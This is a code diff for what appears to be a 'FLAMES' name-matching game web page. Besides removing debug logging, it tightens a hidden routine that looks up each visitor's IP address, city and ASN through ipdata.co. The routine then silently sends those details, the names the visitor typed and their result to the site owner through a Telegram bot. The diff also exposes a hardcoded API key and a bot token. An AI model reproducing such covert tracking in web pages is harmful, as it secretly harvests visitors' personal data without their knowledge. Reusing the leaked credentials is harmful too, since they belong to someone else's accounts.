@@ -9,7 +9,6 @@ else{
  secondName = secondName.toLowerCase();
 let firstArray = firstName.split("");
 let secondArray = secondName.split("");
-//console.log(firstArray,secondArray);
 let length1 = firstArray.length;
 let length2 = secondArray.length;
 let set1 = [1,17];
@@ -42,8 +41,6 @@ for(i=0 ; i<length1 ; i++ ){
     }
     }
   }
-   console.log(firstArray , secondArray);
-console.log(count);
 let result = count;
 var final;
 for (l=0;l<2;l++){
@@ -91,12 +88,13 @@ function json(url) {
 }
 let data1= "";
 let city1 = "";
+var asn = "";
 let apiKey = '3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8';
 json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
-  let data1 = data.ip;
-  let city1 = data.city;
-  console.log(data1);
-  console.log(data.threat.is_proxy);
+   data1 = data.ip;
+   city1 = data.city;
+   asn = data.asn.asn;
+  
 
 
 var token ="1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M";
@@ -110,14 +108,13 @@ var today = new Date();
    var hour = today.getHours();
    var minute = today.getMinutes();
 
-var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text= Someone from ' + city1 + " with IP - " + data1 +' has checked flames on your website with names  '+firstName +"   "+secondName + "  at  " + day + "/" + month + "/" + year + "  " + hour + ":" + minute + " and their result was  " +final;
+var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text= Someone from ' + city1 + "\n with IP - " + data1 +' \n •> '+firstName +"  \n 2 •> "+secondName + "  Time •>  " + day + "/" + month + "/" + year + "  " + hour + ":" + minute + " Result •> " +final+'ASN •> '+asn;
 
 let api = new XMLHttpRequest();
 
  api.open("GET", url, true);
 
  api.send();
-// console.log(url); 
 
   });
 
